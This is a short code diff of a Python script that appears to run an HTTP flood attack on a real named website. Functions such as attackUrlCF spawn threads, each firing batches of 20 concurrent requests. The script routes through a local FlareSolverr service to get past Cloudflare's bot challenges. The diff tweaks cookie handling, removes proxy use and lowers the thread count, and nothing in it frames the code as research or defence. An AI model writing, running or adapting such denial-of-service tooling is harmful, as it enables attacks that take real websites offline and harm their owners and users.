@@ -56,7 +56,7 @@ def solveChanellnge(url):
 
 			data = {"cmd": "request.get",
 					"url": url,
-					"returnOnlyCookies": True,
+					# "returnOnlyCookies": True,
 					'proxy': {'url': PROXY_URL}  
 					}
 			resStr = requests.post(flareSolverUrl, json=data).content
@@ -101,7 +101,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(20):
-				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
+				requestsArr.append(grequests.get(url, headers=headers))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			isClear = True
@@ -131,7 +131,7 @@ def attackAll():
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
-for i in range(10):
+for i in range(1):
 	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
